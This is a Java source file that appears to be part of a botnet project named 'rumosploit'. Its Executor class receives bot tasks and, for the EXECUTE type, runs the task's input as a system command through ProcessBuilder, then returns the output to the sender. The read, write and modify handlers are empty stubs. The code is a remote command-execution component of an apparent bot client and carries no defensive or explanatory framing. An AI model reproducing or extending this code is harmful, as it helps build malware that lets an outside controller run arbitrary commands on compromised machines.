package com.github.rumoel.rumosploit.bot;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;

import com.github.rumoel.rumosploit.bot.network.handlers.BotTaskUtils;
import com.github.rumoel.rumosploit.tasks.BotTask;
import com.github.rumoel.rumosploit.tasks.BotTask.type;
import com.github.rumoel.rumosploit.tasks.BotTaskAnswer;

public final class Executor {
	private Executor() {
	}

	public static void executeTask(BotTask task) {
		type type = task.getTasktype();
		switch (type) {
		case READ:

			break;
		case WRITE:

			break;
		case MODIFY:

			break;
		case EXECUTE:
			executeCmd(task);
			break;

		default:
			break;
		}
	}

	private static void executeCmd(BotTask task) {
		BotTaskAnswer answer = new BotTaskAnswer();
		answer.setTask(task);

		String cmd = task.getInput();
		ArrayList<String> args = new ArrayList<>();

		args.addAll(Arrays.asList(cmd.split(" ")));
		ProcessBuilder processBuilder = new ProcessBuilder(args);
		processBuilder.redirectErrorStream(true);
		try {
			Process process = processBuilder.start();
			String line;
			StringBuilder sb = new StringBuilder();
			try (BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
				while ((line = br.readLine()) != null) {
					sb.append(line);
					sb.append('\n');
				}
			}
			answer.setOutput(sb.toString().getBytes(StandardCharsets.UTF_8));
			BotTaskUtils.response(answer);
		} catch (Exception e) {
			e.printStackTrace();
		}

	}

}
